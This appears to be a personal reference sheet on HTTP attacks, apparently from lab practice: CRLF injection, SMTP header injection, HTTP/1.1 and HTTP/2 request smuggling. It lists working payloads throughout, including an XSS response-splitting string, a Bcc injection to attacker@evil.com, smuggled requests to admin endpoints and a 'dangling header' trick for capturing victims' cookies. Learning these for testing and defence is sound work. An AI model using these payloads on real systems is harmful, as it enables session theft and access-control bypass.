# 🌐 HTTP Attack Techniques Reference

---

## 1. CRLF Injection & Response Splitting

> [!tip] Core Concept Exploits `\r\n` (CRLF) to **break HTTP headers** and manipulate the response. When injecting HTML — always add `Content-Type: text/html` header.

### 🔴 XSS via Response Splitting

```
%0d%0a%0d%0a<html><script>alert(1)</script></html>
```

### 🟡 Chromium Redirect Bypass

In the `Location:` header — use a **leading space or null data** before CRLF to break the redirect and force the browser to render the injected HTML body.

### 🔵 SMTP Injection

> [!warning] Always inject a dummy header after your payload so any trailing data doesn't corrupt it.

|Goal|Payload|
|---|---|
|Add CC/BCC|`victim@mail.com%0d%0aBcc:attacker@evil.com`|
|Overwrite Body|`...%0d%0a%0d%0aNew Message Body Here`|

---

## 2. HTTP Request Smuggling (HRS)

> [!tip] Core Concept Exploits **discrepancies between Frontend (FE) and Backend (BE)** in how they determine request boundaries.

### Core Types

|Type|FE Logic|BE Logic|Exploit Summary|
|---|---|---|---|
|**CL.TE**|`Content-Length`|`Transfer-Encoding`|chunk=`0`, CL is correct → BE processes smuggled suffix|
|**TE.CL**|`Transfer-Encoding`|`Content-Length`|Server reads X bytes; remainder is smuggled|
|**TE.TE**|`Transfer-Encoding`|`Transfer-Encoding`|Both use TE, but **obfuscate** TE so only one side parses it|

---

### CL.TE — Example

```http
POST / HTTP/1.1
Host: clte.htb
Content-Length: 52
Transfer-Encoding: chunked

0

POST /admin.php?promote_uid=2 HTTP/1.1
Dummy:
```

---

### TE.CL — Example

```http
GET /404 HTTP/1.1
Host: tecl.htb
Content-Length: 4
Transfer-Encoding: chunked

27
GET /admin HTTP/1.1
Host: tecl.htb

0
```

---

### TE.TE Obfuscation Bypasses

> [!note] Goal: make one side parse `Transfer-Encoding: chunked`, make the other ignore it.

|Technique|Payload|
|---|---|
|Substring match|`Transfer-Encoding: testchunked`|
|Space in header name|`Transfer-Encoding : chunked`|
|Horizontal Tab|`Transfer-Encoding:[\x09]chunked`|
|Vertical Tab|`Transfer-Encoding:[\x0b]chunked`|
|Leading space|`Transfer-Encoding: chunked`|

---

## 3. HTTP/2 Smuggling (H2.TE / H2.CL)

> [!tip] Core Concept Exploits the **HTTP/2 → HTTP/1.1 downgrade**. CRLF is just _data_ in H2, but becomes a _separator_ in H1.1 — injecting CRLF in H2 fields creates new headers on the backend.

### Injection Points

> [!example] Header Value Injection
> 
> - **Name:** `dummy`
> - **Value:** `asd\r\nTransfer-Encoding: chunked`
> - **Result:** BE sees a new `Transfer-Encoding` header

> [!example] Header Name Injection
> 
> - **Name:** `dummy: asd\r\nTransfer-Encoding`
> - **Value:** `chunked`
> - **Result:** FE treats it as one string; BE splits at CRLF

> [!example] Pseudo-Header Injection (`:method`, `:path`, etc.)
> 
> ```
> :method: POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nDummy: asd
> ```
> 
> Bypasses validation that only checks standard headers.

---

## 🛠️ Smuggling Pro-Tips

> [!success] GHOST Detection Test Smuggle a prefix with an invalid method (e.g., `GHOST / HTTP/1.1`). If the next response is **405 Method Not Allowed** → smuggling is confirmed ✅

> [!warning] Content-Length Sweet Spot
> 
> - **Too small** → won't capture enough of the victim's request
> - **Too large** → server times out waiting for more data

> [!danger] Data Exfiltration — "Dangling Header" Technique End your smuggled request with an open header like `X-Ignore:`. The victim's full request (including **cookies**) gets swallowed as its value and sent to your backend.

> [!note] Authentication in Smuggled Blocks Always include your own `Cookie` and `Host` headers **inside the smuggled block** to ensure the backend processes the request with your permissions.